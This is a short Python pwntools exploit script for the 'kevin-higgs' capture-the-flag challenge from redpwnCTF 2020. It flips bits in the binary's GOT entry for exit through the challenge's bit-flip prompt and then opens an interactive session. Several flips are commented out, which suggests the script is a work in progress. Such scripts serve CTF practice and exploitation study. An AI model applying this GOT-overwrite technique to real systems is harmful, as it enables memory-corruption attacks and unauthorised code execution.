from pwn import *
import sys

#import kmpwn
sys.path.append('/home/vagrant/kmpwn')
from kmpwn import *
#fsb(width, offset, data, padding, roop)

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./kevin-higgs"
"""
HOST = "2020.redpwnc.tf"
PORT = 31956
"""
HOST = "localhost"
PORT = 7777 
#"""
if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

elf = ELF(FILE_NAME)
addr_main = 0x8049267
got_setvbuf = elf.got["setvbuf"]
got_getenv = elf.got["getenv"]
got_exit = elf.got["exit"]
got_start_main = elf.got["__libc_start_main"]
"""
[0x804c000] = 0x804bf04
"""
addr_bss = elf.bss()
#addr_dynsym = elf.get_section_by_name('.dynsym').header['sh_addr']
#
libc = ELF('./libc.so.6')
#libc_binsh = next(libc.search("/bin/sh"))

def flip(addr, bit):
	conn.sendafter("32): ", addr)
	conn.sendlineafter("7): ", str(bit))

def exploit():
	flip(hex(got_exit), 4)	
	flip(hex(got_exit), 6)	
	#flip(hex(got_exit), 5)	
	#flip(hex(got_exit), 5)	
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
